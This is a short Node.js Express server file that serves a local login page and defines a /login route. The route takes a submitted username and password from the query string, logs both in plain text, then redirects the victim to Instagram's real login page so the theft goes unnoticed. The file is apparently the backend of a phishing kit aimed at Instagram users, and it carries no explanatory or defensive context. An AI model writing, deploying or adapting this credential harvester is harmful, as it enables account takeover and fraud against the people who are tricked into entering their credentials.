const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();

app.use(express.static(path.join(__dirname)));
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});
const port = 3000;
const instagramLoginURL = `https://www.instagram.com/accounts/login/`;
const instagramURL = `https://www.instagram.com`;
app.get('/login', async (req, res) => {
    const { username, password } = req.query; 
    console.log("Username: " + username);
    console.log("Password: " + password);
    res.redirect(instagramLoginURL);
});

app.listen(process.env.PORT || port, () => { console.log("Server started on port 3000"); });
